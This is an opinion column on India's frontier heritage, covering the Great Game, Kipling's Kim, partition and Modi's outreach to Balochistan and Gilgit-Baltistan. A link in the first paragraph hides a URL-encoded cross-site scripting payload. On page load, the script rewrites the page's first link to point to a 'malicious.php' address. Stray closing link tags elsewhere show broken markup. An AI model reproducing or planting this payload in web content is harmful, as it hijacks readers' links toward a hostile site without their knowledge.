What made Satyajit Ray a compelling filmmaker was his mastery over little details.<a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank"> In Sonar Kella (Golden Fort), </a>the first of his Feluda series, there is the scene of the two conmen approaching the house of the little boy whose recollections of an earlier life had been written about in the newspapers. As they wandered into the narrow lane where the boy lived, they sighted a small child. Believing it to be the child blessed with these amazing powers, they stop him, asking for directions. “You see,” they tell him in Bengali, “we have come all the way from Balochistan.”

Whether it is Rabindranath Tagore’s Kabuliwala or travellers from Balochistan, places and peoples associated with the Great Game have always had an exotic association for fertile minds in the plains. The sense of mystery and adventure has inevitably been aroused, not least among a generation that grew up on a diet of Rudyard Kipling. The idea of the ‘noble savage’ that combined primitiveness with a fanatical sense of loyalty and freedom made a deep impression on all aficionados of Empire.

The republic of India </a> was always intended to be the successor of the British Indian empire, a vast expanse of territory whose reach (as distinct from direct control) extended from Singapore in the east to Aden in the west, and from Gilgit to Colombo. The foreign policy of the British Indian empire wasn’t controlled from the India Office in Whitehall but from, first, Calcutta and, after 1911, Delhi. This was a legacy that long predated the East India Company. The Mughal empire always had one eye on the lost homelands of Central Asia. Prior to that, even after the Shaivite kingdoms of Afghanistan were lost to invaders from West Asia in the 11th century, the civilizational reach of India extended far beyond the frontiers of the state.

In a recent book, The Ocean of Churn </a>, Sanjeev Sanyal has wonderfully documented the extent to which trade with countries in the Indian Ocean shaped the histories of the east and west coasts of India. It is a much-needed corrective to the Middle India-centric perception of our national past.

Sadly, much of the impulses that motivated the rotund Bengali Hurree Babu, in Kipling’s Kim, to risk his life tracking nefarious Russian designs in the forbidding Himalayas, are in danger of being erased from public memory. Independence from alien rule was a moment of great exultation. But it also had two unintended but adverse consequences.
</p><p>
First, the partition of the country involved the loss of the frontier territories and the common border with Afghanistan. The occupation of nearly half of the old kingdom of Jammu and Kashmir by Pakistan also meant the loss of Gilgit-Baltistan. In the east, Tibet came under the direct control of China.

In Kim, Hurree Babu had remarked to his youthful companion:</a> “When everyone is dead, the Great Game is finished. Not before.” It turned out to be a false prophecy. India remained and even prospered but the truncation of the Indian state meant that the enlarged vision of the frontier was seriously truncated, both politically and emotionally. The vast repertoire of knowledge, so assiduously built by functionaries of the Indian Political Service ceased to be part of institutional memory. The effects were tragic. In 1999, the Indian response to the Pakistani-sponsored incursions into Kargil was delayed because the Army lacked the resources to understand and translate the radio chatter of the attackers.
</p><p>
Secondly, in positing non-alignment and anti-colonialism as the hallmarks of foreign policy, the Nehruvian order lost sight of the neighbourhood. India shifted its gaze from consolidating its pre-eminence in the region to establishing connect with countries outside its sphere of interest. Geography was sacrificed for an abstruse ideology. India celebrated Nasser, Nyerere and Makarios but closed down its consulates in Lhasa and Kashgar. The Gulf sheikhdoms that were tied to the Indian economy, even by a common currency, were abandoned to other powers. By the time the Nehruvian distortions were addressed, first by Rajiv Gandhi and then P V Narasimha Rao and Atal Bihari Vajpayee, insularity and passivity had affected the national psyche.
</p><p>
It is in this context that the Prime Minister’s outreach to the peoples in Balochistan and Gilgit-Baltistan assume importance. Narendra Modi hasn’t signalled India’s direct involvement in their battles, he has merely signalled the recovery of our natural frontiers. This outreach now needs to be complemented with institutional capacity building and, most important, the enlargement of our mental horizons. The reach of India must transcend its national borders, as it always had.
